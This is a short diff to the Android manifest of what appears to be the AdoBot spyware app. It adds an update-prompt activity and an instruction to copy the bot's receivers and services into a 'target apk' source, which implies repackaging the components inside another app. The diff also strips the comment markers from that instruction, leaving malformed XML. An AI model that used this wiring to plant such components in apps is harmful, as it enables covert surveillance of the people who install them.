@@ -52,7 +52,12 @@
         </activity>
 
 
-        <!--copy the receivers and services to the target apk source-->
+        copy the receivers and services to the target apk source
+        <activity android:name="buddy.ap.com.adobot.PromptUpdateActivity">
+            <!--<intent-filter>-->
+                <!--<action android:name="buddy.ap.com.adobot.UPDATE_URL" />-->
+            <!--</intent-filter>-->
+        </activity>
 
         <receiver android:name="buddy.ap.com.adobot.NetworkWatcher">
             <intent-filter>
